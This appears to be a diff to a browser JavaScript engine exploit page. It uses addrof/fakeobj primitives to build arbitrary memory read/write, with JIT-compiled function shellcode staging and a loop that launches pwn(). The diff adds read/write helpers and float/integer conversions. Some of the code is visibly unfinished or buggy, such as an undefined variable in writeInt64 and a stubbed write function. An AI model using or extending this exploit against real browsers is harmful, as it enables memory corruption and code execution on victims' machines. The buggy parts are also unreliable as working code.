@@ -318,7 +318,7 @@ let stage1 = {
         var obj = arg[0];
 
         if (typeof obj === 'object')
-        	alert("succeeded");
+            alert("succeeded");
             return obj;
 
         //alert("Could not inject fake object using 'fakeobj' primitive!")
@@ -486,6 +486,12 @@ let primitives = stage1;
     // | +24 <8> butterfly                <--+
     // +----------------------------------+
     //
+    var realarray = [];
+
+    var realarrayaddr = primitives.addrof(realarray);
+    var realarrrayjscellheader = realarrayaddr+0x8;
+    print(realarrrayjscellheader);
+
 
     var containerAddr = primitives.addrof(container);
     print("[+] Container @ " + containerAddr);
@@ -690,6 +696,15 @@ let primitives = stage1;
     //
     // Time to upgrade exploit primitives!
     //
+    function i2f(x) {
+      u32[0] = x % BASE;
+      u32[1] = (x - (x % BASE)) / BASE;
+      return f64[0];
+}
+function f2i(x) {
+      f64[0] = x;
+      return u32[0] + BASE * u32[1];
+}
     primitives = {
         addrof: function(obj) {
             boxed[0] = obj;
@@ -697,7 +712,7 @@ let primitives = stage1;
         },
 
         fakeobj: function(addr) {
-            unboxed[0] = addr.asDouble();
+            unboxed[0] = (new Int64(addr)).asDouble();
             return boxed[0];
         },
 
@@ -777,9 +792,40 @@ let primitives = stage1;
         read64: function(addr) {
             driver[1] = Add(addr, 0x10).asDouble();
             return this.addrof(victim.prop);
-        }
-    };
+        },
+        writeInt64: function(where,what) {
+            driver[1] = Add(addr, 0x10).asDouble();
+            victim.prop = this.fakeobj(f2i(what.asDouble()));
+        },
+        readInt64: function(where) {
+            driver[1] = Add(where, 0x10).asDouble();
+            var res = this.addrof(victim.prop);
+            return new Int64(res);
+        },
+        read: function(addr, length) {
+            var a = new Array(length);
+            var i;
 
+            for (i = 0; i + 8 < length; i += 8) {
+                v = this.readInt64(addr + i).bytes()
+                for (var j = 0; j < 8; j++) {
+                    a[i+j] = v[j];
+                }
+            }
+
+            v = this.readInt64(addr + i).bytes()
+            for (var j = i; j < length; j++) {
+                a[j] = v[j - i];
+            }
+
+            return a
+        },
+
+        write: function(addr, data) {
+            throw 'maybe later'
+        },
+    };
+    alert(primitives.read({},8))
     print("[+] Got arbitrary memory read/write!");
     function makeJITCompiledFunction() {
     // Some code to avoid inlining...
@@ -931,7 +977,7 @@ var shellcodeFunc = makeJITCompiledFunction();
     // Ensure we're running on macOS by analysing the prologue
     // of the JIT function.
     //
-
+    //primitives.write64(,0xdeadbeef0)
     
 }
 function init() {
@@ -939,21 +985,10 @@ function init() {
 }
 
 for (var k = 0; k < 10000; k++) {
-	init();
-	if(k == 9999) {
-		alert("Credits to me @turnerhackz1 press continue");
-		pwn();
-	}
+    init();
+    if(k == 9999) {
+        alert("Credits to me @turnerhackz1 press continue");
+        pwn();
+    }
 }
 </script>
-© 2020 GitHub, Inc.
-Terms
-Privacy
-Security
-Status
-Help
-Contact GitHub
-Pricing
-API
-Training
-Blo
